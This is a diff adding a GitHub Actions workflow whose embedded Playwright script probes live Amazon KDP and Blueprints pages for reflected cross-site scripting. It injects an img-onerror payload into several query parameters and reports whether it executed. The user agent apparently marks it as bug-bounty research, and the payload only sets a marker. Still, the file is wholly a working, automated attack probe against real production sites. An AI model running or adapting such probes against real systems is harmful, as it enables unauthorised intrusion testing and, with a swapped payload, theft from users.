@@ -1,0 +1,64 @@
+name: Amazon App-Surface XSS Probe
+
+on:
+  workflow_dispatch:
+  push:
+    paths:
+      - ".github/workflows/amazon-app-xss.yml"
+
+permissions:
+  contents: read
+
+jobs:
+  xss:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+      - run: npm install playwright@1.55.0
+      - run: npx playwright install chromium
+
+      - name: Test Amazon app surfaces
+        shell: bash
+        run: |
+          set -euo pipefail
+          cat > /tmp/probe.mjs <<'JS'
+          import { chromium } from "playwright";
+          const ua="amazonvrpresearcher_pradyuman1";
+          const p='<img src=x onerror="document.body.dataset.h1xss=\\'EXECUTED\\'">';
+          const enc=encodeURIComponent(p);
+          const targets=[
+            ["kdp-q","https://kdp.amazon.com/en_US/?q="+enc],
+            ["kdp-search","https://kdp.amazon.com/en_US/?search="+enc],
+            ["kdp-ref","https://kdp.amazon.com/en_US/?ref="+enc],
+            ["blueprints-q","https://blueprints.amazon.com/?q="+enc],
+            ["blueprints-search","https://blueprints.amazon.com/?search="+enc],
+            ["blueprints-ref","https://blueprints.amazon.com/?ref="+enc]
+          ];
+          const browser=await chromium.launch({headless:true});
+          let finding=false;
+          for(const [name,url] of targets){
+            const page=await browser.newPage({userAgent:ua,extraHTTPHeaders:{"Accept-Language":"en-US,en;q=0.9"}});
+            try{
+              const resp=await page.goto(url,{waitUntil:"domcontentloaded",timeout:30000});
+              await page.waitForTimeout(1500);
+              const executed=await page.evaluate(()=>document.body?.dataset?.h1xss==="EXECUTED");
+              const html=await page.content();
+              console.log("TEST",name,"STATUS",resp?.status()??null,"EXECUTED",executed,"MARKER_IN_DOM",html.includes("EXECUTED"),"FINAL_URL",page.url());
+              if(executed){
+                console.log("VERIFIED_FINDING",name,url);
+                finding=true;
+                break;
+              }
+            }catch(e){console.log("ERROR",name,String(e));}
+            finally{await page.close();}
+            await new Promise(r=>setTimeout(r,1800));
+          }
+          await browser.close();
+          if(!finding) console.log("NO_VERIFIED_APP_SURFACE_XSS");
+          if(finding) process.exit(42);
+          JS
+          node /tmp/probe.mjs
